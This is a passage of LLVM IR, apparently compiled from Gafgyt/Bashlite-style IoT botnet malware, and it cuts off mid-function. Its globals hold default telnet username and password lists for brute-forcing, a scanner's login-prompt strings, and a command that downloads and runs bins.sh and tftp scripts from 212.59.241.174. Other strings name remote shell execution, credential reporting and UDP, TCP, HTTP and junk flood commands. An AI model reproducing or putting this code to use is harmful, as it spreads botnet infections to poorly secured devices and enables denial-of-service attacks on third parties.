; ModuleID = 'host/ir_O1/L7.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@encodes = local_unnamed_addr global [87 x i8] c"<>@o$:,.l+*^?=)(|AB&%;D\22!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][", align 16
@decodes = local_unnamed_addr global [87 x i8] c"0123456789abcdefghijklmnopqrstuvzywxABCDEFGHIJKLMNOPQRSTUVZYWX|:. !#-/;&*'\22\0A\0D\00>$%(),?=@", align 16
@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [7 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@passwords = local_unnamed_addr global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.7 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.88 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.16 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.19 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.22 = private unnamed_addr constant [10 x i8] c"recv: %s\0A\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.24 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.25 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.27 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.29 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [266 x i8] c"cd /tmp; wget http://212.59.241.174/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 212.59.241.174 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 212.59.241.174; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [50 x i8] c"/bin/busybox;echo -e '\5C147\5C141\5C171\5C146\5C147\5C164'\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.34 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.35 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"REPORT %s:%s:\00", align 1
@.str.37 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.38 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.39 = private unnamed_addr constant [18 x i8] c"wget -O /tmp/fff \00", align 1
@.str.40 = private unnamed_addr constant [14 x i8] c" > /dev/null \00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.50 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.52 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.53 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.54 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.58 = private unnamed_addr constant [36 x i8] c"HOLD Flooding %s:%d for %d seconds.\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.60 = private unnamed_addr constant [36 x i8] c"JUNK Flooding %s:%d for %d seconds.\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.62 = private unnamed_addr constant [32 x i8] c"UDP Flooding %s for %d seconds.\00", align 1
@.str.63 = private unnamed_addr constant [35 x i8] c"UDP Flooding %s:%d for %d seconds.\00", align 1
@.str.64 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.65 = private unnamed_addr constant [33 x i8] c"HTTP Flooding %s for %d seconds.\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.67 = private unnamed_addr constant [32 x i8] c"TCP Flooding %s for %d seconds.\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.69 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.72 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.73 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.74 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.75 = private unnamed_addr constant [7 x i8] c"GAYFGT\00", align 1
@.str.76 = private unnamed_addr constant [36 x i8] c"MAC: %02X:%02X:%02X:%02X:%02X:%02X\0A\00", align 1
@.str.78 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.79 = private unnamed_addr constant [22 x i8] c"Failed to connect...\0A\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.81 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.82 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.83 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.84 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.85 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.86 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.87 = private unnamed_addr constant [24 x i8] c"Link closed by server.\0A\00", align 1
@ipState.1 = internal unnamed_addr global i8 0, align 1
@ipState.2 = internal unnamed_addr global i8 0, align 1
@ipState.3 = internal unnamed_addr global i8 0, align 1
@ipState.4 = internal unnamed_addr global i8 0, align 1
@str = private unnamed_addr constant [23 x i8] c"Link closed by server.\00"
@str.1 = private unnamed_addr constant [21 x i8] c"Failed to connect...\00"

; Function Attrs: noinline nounwind uwtable
define noalias i8* @encode(i8* nocapture readonly) local_unnamed_addr #0 {
  %2 = alloca [512 x i8], align 16
  %3 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 512, i32 16, i1 false)
  %strlenfirst = load i8, i8* %0, align 1
  %4 = icmp eq i8 %strlenfirst, 0
  br i1 %4, label %._crit_edge, label %.preheader.preheader

.preheader.preheader:                             ; preds = %1
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %21
  %indvars.iv18 = phi i64 [ %indvars.iv.next19, %21 ], [ 0, %.preheader.preheader ]
  %.01316 = phi i32 [ %.2.1, %21 ], [ 0, %.preheader.preheader ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv18
  %6 = load i8, i8* %5, align 1
  br label %7

; <label>:7:                                      ; preds = %33, %.preheader
  %indvars.iv = phi i64 [ 0, %.preheader ], [ %indvars.iv.next.1, %33 ]
  %.114 = phi i32 [ %.01316, %.preheader ], [ %.2.1, %33 ]
  %8 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 2
  %10 = icmp eq i8 %6, %9
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %7
  %12 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %indvars.iv
  %13 = load i8, i8* %12, align 2
  %14 = sext i32 %.114 to i64
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %14
  store i8 %13, i8* %15, align 1
  %16 = add nsw i32 %.114, 1
  br label %17

; <label>:17:                                     ; preds = %7, %11
  %.2 = phi i32 [ %16, %11 ], [ %.114, %7 ]
  %indvars.iv.next = or i64 %indvars.iv, 1
  %18 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %indvars.iv.next
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %6, %19
  br i1 %20, label %27, label %33

; <label>:21:                                     ; preds = %33
  %indvars.iv.next19 = add nuw nsw i64 %indvars.iv18, 1
  %22 = tail call i64 @strlen(i8* %0) #15
  %23 = icmp ult i64 %indvars.iv.next19, %22
  br i1 %23, label %.preheader, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %21
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.013.lcssa = phi i32 [ 0, %1 ], [ %.2.1, %._crit_edge.loopexit ]
  %24 = sext i32 %.013.lcssa to i64
  %25 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %24
  store i8 0, i8* %25, align 1
  %26 = call noalias i8* @strdup(i8* nonnull %3) #5
  ret i8* %26

; <label>:27:                                     ; preds = %17
  %28 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %indvars.iv.next
  %29 = load i8, i8* %28, align 1
  %30 = sext i32 %.2 to i64
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %30
  store i8 %29, i8* %31, align 1
  %32 = add nsw i32 %.2, 1
  br label %33

; <label>:33:                                     ; preds = %27, %17
  %.2.1 = phi i32 [ %32, %27 ], [ %.2, %17 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, 88
  br i1 %exitcond.1, label %21, label %7
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #1

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare noalias i8* @strdup(i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define noalias i8* @decode(i8* nocapture readonly) local_unnamed_addr #0 {
  %2 = alloca [512 x i8], align 16
  %3 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 512, i32 16, i1 false)
  %strlenfirst = load i8, i8* %0, align 1
  %4 = icmp eq i8 %strlenfirst, 0
  br i1 %4, label %._crit_edge, label %.preheader.preheader

.preheader.preheader:                             ; preds = %1
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %21
  %indvars.iv18 = phi i64 [ %indvars.iv.next19, %21 ], [ 0, %.preheader.preheader ]
  %.01316 = phi i32 [ %.2.1, %21 ], [ 0, %.preheader.preheader ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv18
  %6 = load i8, i8* %5, align 1
  br label %7

; <label>:7:                                      ; preds = %33, %.preheader
  %indvars.iv = phi i64 [ 0, %.preheader ], [ %indvars.iv.next.1, %33 ]
  %.114 = phi i32 [ %.01316, %.preheader ], [ %.2.1, %33 ]
  %8 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 2
  %10 = icmp eq i8 %6, %9
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %7
  %12 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %indvars.iv
  %13 = load i8, i8* %12, align 2
  %14 = sext i32 %.114 to i64
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %14
  store i8 %13, i8* %15, align 1
  %16 = add nsw i32 %.114, 1
  br label %17

; <label>:17:                                     ; preds = %7, %11
  %.2 = phi i32 [ %16, %11 ], [ %.114, %7 ]
  %indvars.iv.next = or i64 %indvars.iv, 1
  %18 = getelementptr inbounds [87 x i8], [87 x i8]* @encodes, i64 0, i64 %indvars.iv.next
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %6, %19
  br i1 %20, label %27, label %33

; <label>:21:                                     ; preds = %33
  %indvars.iv.next19 = add nuw nsw i64 %indvars.iv18, 1
  %22 = tail call i64 @strlen(i8* %0) #15
  %23 = icmp ult i64 %indvars.iv.next19, %22
  br i1 %23, label %.preheader, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %21
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.013.lcssa = phi i32 [ 0, %1 ], [ %.2.1, %._crit_edge.loopexit ]
  %24 = sext i32 %.013.lcssa to i64
  %25 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %24
  store i8 0, i8* %25, align 1
  %26 = call noalias i8* @strdup(i8* nonnull %3) #5
  ret i8* %26

; <label>:27:                                     ; preds = %17
  %28 = getelementptr inbounds [87 x i8], [87 x i8]* @decodes, i64 0, i64 %indvars.iv.next
  %29 = load i8, i8* %28, align 1
  %30 = sext i32 %.2 to i64
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i64 0, i64 %30
  store i8 %29, i8* %31, align 1
  %32 = add nsw i32 %.2, 1
  br label %33

; <label>:33:                                     ; preds = %27, %17
  %.2.1 = phi i32 [ %32, %27 ], [ %.2, %17 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, 88
  br i1 %exitcond.1, label %21, label %7
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #4 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #4 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #0 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #15
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #15
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
